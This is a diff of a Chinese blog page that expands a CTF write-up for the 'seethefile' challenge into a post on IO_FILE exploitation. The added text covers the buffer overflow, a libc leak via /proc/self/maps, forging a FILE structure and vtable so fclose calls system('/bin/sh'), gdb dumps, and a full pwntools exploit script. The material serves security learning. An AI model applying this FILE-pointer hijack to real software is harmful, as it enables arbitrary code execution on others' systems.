@@ -108,17 +108,17 @@
 
 
 
-  <meta name="description" content="p stderrseethefile首先看程序，大致思路是通过name,name 覆盖到 fp,在调用fcolse是调用system(“bin/sh”)  openfile:读取63 filename,打开文件,应该有溢出? 应该不能覆盖到fp writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf  readfile:从文件中读取内容到 0x18">
+  <meta name="description" content="IO FILE 利用">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="seethefile-writeup">
+<meta property="og:title" content="CTF | IO_FILE 相关利用">
 <meta property="og:url" content="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="p stderrseethefile首先看程序，大致思路是通过name,name 覆盖到 fp,在调用fcolse是调用system(“bin/sh”)  openfile:读取63 filename,打开文件,应该有溢出? 应该不能覆盖到fp writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf  readfile:从文件中读取内容到 0x18">
-<meta property="og:updated_time" content="2018-08-14T09:48:10.056Z">
+<meta property="og:description" content="IO FILE 利用">
+<meta property="og:updated_time" content="2018-10-08T12:26:16.819Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="seethefile-writeup">
-<meta name="twitter:description" content="p stderrseethefile首先看程序，大致思路是通过name,name 覆盖到 fp,在调用fcolse是调用system(“bin/sh”)  openfile:读取63 filename,打开文件,应该有溢出? 应该不能覆盖到fp writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf  readfile:从文件中读取内容到 0x18">
+<meta name="twitter:title" content="CTF | IO_FILE 相关利用">
+<meta name="twitter:description" content="IO FILE 利用">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>seethefile-writeup | 尿尿</title>
+  <title>CTF | IO_FILE 相关利用 | 尿尿</title>
   
 
 
@@ -343,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">seethefile-writeup
+          <h1 class="post-title" itemprop="name headline">CTF | IO_FILE 相关利用
               
             
           </h1>
@@ -368,12 +368,24 @@
                 
               
 
-              <time title="Created: 2018-08-14 15:52:08 / Modified: 17:48:10" itemprop="dateCreated datePublished" datetime="2018-08-14T15:52:08+08:00">2018-08-14</time>
+              <time title="Created: 2018-08-14 15:52:08" itemprop="dateCreated datePublished" datetime="2018-08-14T15:52:08+08:00">2018-08-14</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-10-08 20:26:16" itemprop="dateModified" datetime="2018-10-08T20:26:16+08:00">2018-10-08</time>
               
             
           </span>
@@ -398,7 +410,7 @@
 
           
           
-             <span id="/2018/08/14/seethefile-writeup/" class="leancloud_visitors" data-flag-title="seethefile-writeup">
+             <span id="/2018/08/14/seethefile-writeup/" class="leancloud_visitors" data-flag-title="CTF | IO_FILE 相关利用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -423,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">2.2k</span>
+                <span title="Symbols count in article">7.9k</span>
               
 
               
@@ -437,7 +449,7 @@
                 
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
-                <span title="Reading time">2 mins.</span>
+                <span title="Reading time">7 mins.</span>
               
             </div>
           
@@ -457,38 +469,32 @@
       
 
       
-        <p>p stderr<br><strong>seethefile</strong><br>首先看程序，大致思路是通过name,name 覆盖到 fp,在调用fcolse是调用system(“bin/sh”)</p>
+        <p>IO FILE 利用<br><a id="more"></a></p>
+<h2 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先看程序</p>
 <ul>
-<li>openfile:读取63 filename,打开文件,应该有溢出? 应该不能覆盖到fp</li>
-<li>writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf </li>
-<li>readfile:从文件中读取内容到 0x18 长度,magicbuf</li>
-<li>exit:通过 name 覆盖 fp，可行</li>
+<li><code>openfile</code>:读取 长度为63 <code>filename</code>,打开文件,这里有溢出，因为 <code>filename</code> 大小为 <code>40</code>,但是不能覆盖到fp</li>
+<li><code>writefile</code>:输出文件 <code>magicbuf</code>，通过这个应该能泄露地址，首先要把内容写道magicbuf </li>
+<li><code>readfile</code>:从文件中读取内容到 <code>0x18</code> 长度</li>
+<li><code>closefile</code>: 这里会调用 <code>fclose</code> 函数，可以用来触发</li>
+<li><code>exit</code> : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用<code>fcolse</code>时调用<code>system(&quot;bin/sh&quot;)</code></li>
 </ul>
-<ol>
-<li>覆盖构造</li>
-<li><p>我不知道libc版本，给了libc<br>怎么使用PRELOAD</p>
-</li>
-<li><p>system 函数</p>
-</li>
-<li><p><strong>怎么泄露地址</strong><br>在linux系统中，文件<code>/proc/[pid]/maps</code>中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。</p>
-</li>
-<li><p>还不是很清楚修改io_buf_base的操作。<br>成功获得shell；但并不能直接cat flag，需要运行get_flag，然后输入指定的字符串通过比较即可。?</p>
-</li>
-</ol>
-<p>应该利用前面的功能获取信息，最后一步输入name，覆盖fp，调用 system<br>将 _IO_FINISH 覆盖为system地址？<br>fp 指向伪造 IO_file,伪造的 IO_file 存在，还要指向伪造的 vtable，<br>地址<br>vtable 地址在64位下偏移为d8，</p>
-<ul>
-<li>因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把”sh”写入_IO_FILE_plus头部。</li>
-</ul>
-<p>利用name覆盖，结构<br>| junk | fp | IO_FILE | IO_file_jumps ptr | IO_file_jumps |</p>
+<p>bss data laylout<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.bss:0804B080 filename        db 40h dup(?)           ; DATA XREF: openfile+53↑o</div><div class="line">.bss:0804B080                                         ; openfile+6D↑o ...</div><div class="line">.bss:0804B0C0                 public magicbuf</div><div class="line">.bss:0804B0C0 ; char magicbuf[416]</div><div class="line">.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o</div><div class="line">.bss:0804B0C0                                         ; readfile+17↑o ...</div><div class="line">.bss:0804B260                 public name</div><div class="line">.bss:0804B260 ; char name[32]</div><div class="line">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o</div><div class="line">.bss:0804B260                                         ; main+B4↑o</div><div class="line">.bss:0804B280                 public fp</div><div class="line">.bss:0804B280 ; FILE *fp</div><div class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</div><div class="line">.bss:0804B280                                         ; openfile+AD↑w ...</div><div class="line">.bss:0804B280 _bss            ends</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在linux系统中，文件<code>/proc/[pid]/maps</code>中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。</p>
+<h4 id="构造-FILE"><a href="#构造-FILE" class="headerlink" title="构造 FILE"></a>构造 FILE</h4><p><code>fp</code> 指向伪造 <code>IO_file</code>,伪造的 <code>IO_file</code> 存在，还要指向伪造的 <code>vtable，</code>  将<code>vtable-&gt;__fclose</code>覆盖为 system 地址<br>因为<code>vtable</code>中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把<code>&quot;sh&quot;</code>写入<code>_IO_FILE_plus</code>头部。<br>利用<code>name</code>覆盖，结构<br><code>| junk | fp | IO_FILE | IO_file_jumps ptr | IO_file_jumps |</code></p>
 <p>但是构造的时候需要注意：</p>
 <ol>
-<li>IO_FILE结构偏移0x34处即_chain字段指向的也是一个FILE结构，我们可以用我们伪造的IO_FILE_plus地址填充这个字段</li>
-<li>偏移0x48处的lock字段指向的是一个IO_stdfile_2_lock结构，本地调试时这个结构中的数据均为\x00；因此，我们可以用\x00填充name，然后用name的地址覆盖lock字段。</li>
+<li><code>IO_FILE</code> 结构偏移<code>0x34</code>处即<code>_chain</code>字段指向的也是一个<code>FILE</code>结构，我们可以用我们伪造的<code>IO_FILE_plus</code>地址填充这个字段,发现不伪造也行。</li>
+<li>偏移<code>0x48</code>处的<code>lock</code>字段指向的是一个<code>IO_stdfile_2_lock</code>结构，本地调试时这个结构中的数据均为<code>\x00</code>；因此，我们可以用<code>\x00</code>填充<code>name</code>，然后用<code>name</code>的地址覆盖<code>lock</code>字段。</li>
 </ol>
-<p>注:程序为32位</p>
-<p>p _IO_2_1<em>stderr</em><br>p _IO_file_jumps<br>要注意_vtable_offset要为0，其偏移为0x46且只占一个字节 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">const struct _IO_jump_t _IO_file_jumps =  </div><div class="line">&#123;  </div><div class="line">  JUMP_INIT_DUMMY,  </div><div class="line">  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  </div><div class="line">  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  </div><div class="line">  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  </div><div class="line">  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  </div><div class="line">  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  </div><div class="line">  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),</div><div class="line">  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  </div><div class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),  </div><div class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),  </div><div class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf), </div><div class="line">  JUMP_INIT(sync, _IO_new_file_sync),  </div><div class="line">  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  </div><div class="line">  JUMP_INIT(read, INTUSE(_IO_file_read)),  </div><div class="line">  JUMP_INIT(write, _IO_new_file_write),  </div><div class="line">  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  </div><div class="line">  JUMP_INIT(close, INTUSE(_IO_file_close)),  </div><div class="line">  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  </div><div class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),  </div><div class="line">  JUMP_INIT(imbue, _IO_default_imbue)  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>0x70  _fileno<br>0x74  _flags2<br>在构造的时候不知道为啥检查了struct _IO_marker *_markers这个成员，需要这个地方指向一个可读内存区域，然而我自己写程序调试的时候这个变量为0，不知道是不是和flag有些关系，不过改了之后能过，也就不想深究了。<br><code>p.sendline(&#39;Give me the flag\x00&#39;)</code></p>
+<p>我们在 gdb 中 通过 <code>directory ~/glibc-2.23/libio</code> 就可以看到 libc 中的代码了</p>
+<p>修改前：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">gef➤  p *((struct _IO_FILE_plus*)<span class="number">0x804B260</span>)             </div><div class="line">$<span class="number">2</span> = &#123;</div><div class="line">  file = &#123;</div><div class="line">    _flags = <span class="number">0x0</span>, </div><div class="line">    _IO_read_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_read_end = <span class="number">0x0</span>, </div><div class="line">    _IO_read_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_write_end = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_base = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_end = <span class="number">0x9861010</span> <span class="string">"\210$\255\373\216\024\206\tp\025\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\025\206\t"</span>, </div><div class="line">    _IO_save_base = <span class="number">0x0</span>, </div><div class="line">    _IO_backup_base = <span class="number">0x0</span>, </div><div class="line">    _IO_save_end = <span class="number">0x0</span>, </div><div class="line">    _markers = <span class="number">0x0</span>, </div><div class="line">    _chain = <span class="number">0x0</span>, </div><div class="line">    _fileno = <span class="number">0x0</span>, </div><div class="line">    _flags2 = <span class="number">0x0</span>, </div><div class="line">    _old_offset = <span class="number">0x0</span>, </div><div class="line">    _cur_column = <span class="number">0x0</span>, </div><div class="line">    _vtable_offset = <span class="number">0x0</span>, </div><div class="line">    _shortbuf = <span class="string">""</span>, </div><div class="line">    _lock = <span class="number">0x0</span>, </div><div class="line">    _offset = <span class="number">0x0</span>, </div><div class="line">    _codecvt = <span class="number">0x0</span>, </div><div class="line">    _wide_data = <span class="number">0x0</span>, </div><div class="line">    _freeres_list = <span class="number">0x0</span>, </div><div class="line">    _freeres_buf = <span class="number">0x0</span>, </div><div class="line">    __pad5 = <span class="number">0x0</span>, </div><div class="line">    _mode = <span class="number">0x0</span>, </div><div class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">39</span> times&gt;</div><div class="line">  &#125;, </div><div class="line">  vtable = <span class="number">0x0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>修改后<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">gef➤   p *((struct _IO_FILE_plus*)<span class="number">0x804B260</span>)  </div><div class="line">$<span class="number">8</span> = &#123;</div><div class="line">  file = &#123;</div><div class="line">    _flags = <span class="number">0x6e69622f</span>, </div><div class="line">    _IO_read_ptr = <span class="number">0x68732f</span> &lt;error: Cannot access memory at address <span class="number">0x68732f</span>&gt;, </div><div class="line">    _IO_read_end = <span class="number">0x0</span>, </div><div class="line">    _IO_read_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_write_end = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_base = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_end = <span class="number">0x804b260</span> &lt;name&gt; <span class="string">"/bin/sh"</span>, </div><div class="line">    _IO_save_base = <span class="number">0x0</span>, </div><div class="line">    _IO_backup_base = <span class="number">0x0</span>, </div><div class="line">    _IO_save_end = <span class="number">0x0</span>, </div><div class="line">    _markers = <span class="number">0x0</span>, </div><div class="line">    _chain = <span class="number">0x0</span>, </div><div class="line">    _fileno = <span class="number">0x0</span>, </div><div class="line">    _flags2 = <span class="number">0x0</span>, </div><div class="line">    _old_offset = <span class="number">0x0</span>, </div><div class="line">    _cur_column = <span class="number">0x0</span>, </div><div class="line">    _vtable_offset = <span class="number">0x0</span>, </div><div class="line">    _shortbuf = <span class="string">""</span>, </div><div class="line">    _lock = <span class="number">0x804b270</span> &lt;name+<span class="number">16</span>&gt;, </div><div class="line">    _offset = <span class="number">0x0</span>, </div><div class="line">    _codecvt = <span class="number">0x0</span>, </div><div class="line">    _wide_data = <span class="number">0x0</span>, </div><div class="line">    _freeres_list = <span class="number">0x0</span>, </div><div class="line">    _freeres_buf = <span class="number">0x0</span>, </div><div class="line">    __pad5 = <span class="number">0x0</span>, </div><div class="line">    _mode = <span class="number">0x0</span>, </div><div class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">39</span> times&gt;</div><div class="line">  &#125;, </div><div class="line">  vtable = <span class="number">0x804b2b4</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>vtable：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">gef➤   p *((struct _IO_jump_t*)<span class="number">0x804b2b4</span>)  </div><div class="line">$<span class="number">9</span> = &#123;</div><div class="line">  __dummy = <span class="number">0x0</span>, </div><div class="line">  __dummy2 = <span class="number">0x0</span>, </div><div class="line">  __finish = <span class="number">0x0</span>, </div><div class="line">  __overflow = <span class="number">0x0</span>, </div><div class="line">  __underflow = <span class="number">0x0</span>, </div><div class="line">  __uflow = <span class="number">0x0</span>, </div><div class="line">  __pbackfail = <span class="number">0x0</span>, </div><div class="line">  __xsputn = <span class="number">0x0</span>, </div><div class="line">  __xsgetn = <span class="number">0x0</span>, </div><div class="line">  __seekoff = <span class="number">0x0</span>, </div><div class="line">  __seekpos = <span class="number">0x0</span>, </div><div class="line">  __setbuf = <span class="number">0x0</span>, </div><div class="line">  __sync = <span class="number">0x0</span>, </div><div class="line">  __doallocate = <span class="number">0x0</span>, </div><div class="line">  __read = <span class="number">0x0</span>, </div><div class="line">  __write = <span class="number">0x0</span>, </div><div class="line">  __seek = <span class="number">0x804b2b4</span>, </div><div class="line">  __close = <span class="number">0xf7e24da0</span> &lt;__libc_system&gt;, </div><div class="line">  __stat = <span class="number">0x0</span>, </div><div class="line">  __showmanyc = <span class="number">0x0</span>, </div><div class="line">  __imbue = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line">gef➤</div></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = <span class="string">'./seethefile'</span></div><div class="line">elf = ELF(binary)</div><div class="line">libc = elf.libc</div><div class="line"></div><div class="line">io = process(binary)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">':'</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(nm)</span>:</span></div><div class="line">    menu(<span class="number">5</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(nm)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(nm)</span>:</span></div><div class="line">    menu(<span class="number">1</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(nm)</div><div class="line">    menu(<span class="number">2</span>)</div><div class="line">    menu(<span class="number">2</span>)</div><div class="line">    menu(<span class="number">3</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc address </span></div><div class="line">read_file(<span class="string">'/proc/self/maps'</span>)</div><div class="line">libc_addr = io.recvuntil(<span class="string">"r-xp"</span>)</div><div class="line">libc.address = int(libc_addr.split(<span class="string">'-'</span>)[<span class="number">-3</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</div><div class="line">log.info(<span class="string">"\033[33m"</span> + hex(libc.address) + <span class="string">"\033[0m"</span>)</div><div class="line"></div><div class="line"></div><div class="line">buffer = <span class="number">0x804b260</span> <span class="comment"># name's address </span></div><div class="line">pay = <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(buffer)</div><div class="line">pay = pay.ljust(<span class="number">0x48</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(buffer + <span class="number">0x10</span>) <span class="comment"># make lock point to '\x00'</span></div><div class="line">pay = pay.ljust(<span class="number">0x94</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>) <span class="comment"># vtable address,0x44 is fclose's offset </span></div><div class="line">pay += p32(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># 0x804b260+0x94 + 4 =0x804b2f8 </span></div><div class="line"><span class="comment">#gdb.attach(io)</span></div><div class="line">leave_name(pay)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>vtable 结构<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">const struct _IO_jump_t _IO_file_jumps =  </div><div class="line">&#123;  </div><div class="line">  JUMP_INIT_DUMMY,  </div><div class="line">  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  </div><div class="line">  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  </div><div class="line">  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  </div><div class="line">  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  </div><div class="line">  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  </div><div class="line">  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),</div><div class="line">  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  </div><div class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),  </div><div class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),  </div><div class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf), </div><div class="line">  JUMP_INIT(sync, _IO_new_file_sync),  </div><div class="line">  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  </div><div class="line">  JUMP_INIT(read, INTUSE(_IO_file_read)),  </div><div class="line">  JUMP_INIT(write, _IO_new_file_write),  </div><div class="line">  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  </div><div class="line">  JUMP_INIT(close, INTUSE(_IO_file_close)),  </div><div class="line">  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  </div><div class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),  </div><div class="line">  JUMP_INIT(imbue, _IO_default_imbue)  </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p><code>IO FILE</code> 结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _IO_FILE</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></div><div class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line">  <span class="keyword">struct</span> _IO_marker *_markers;</div><div class="line">  <span class="keyword">struct</span> _IO_FILE *_chain;</div><div class="line">  <span class="keyword">int</span> _fileno;</div><div class="line">  <span class="keyword">int</span> _flags2;</div><div class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</div><div class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</div><div class="line">  _IO_lock_t *_lock;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p><code>__flags</code> 记录 <code>FILE</code> 结构体的一些状态；<br><code>_markers</code> 为指向 <code>markers</code> 结构体的指针变量，存放流的位置的单向链表；<br><code>_chain</code> 变量为一个单向链表的指针，记录进程中创建的 <code>FILE</code> 结构体。</p>
+<h3 id="推荐链接"><a href="#推荐链接" class="headerlink" title="推荐链接"></a>推荐链接</h3><p><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/" target="_blank" rel="external">https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/</a></p>
 
       
     </div>
@@ -583,8 +589,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
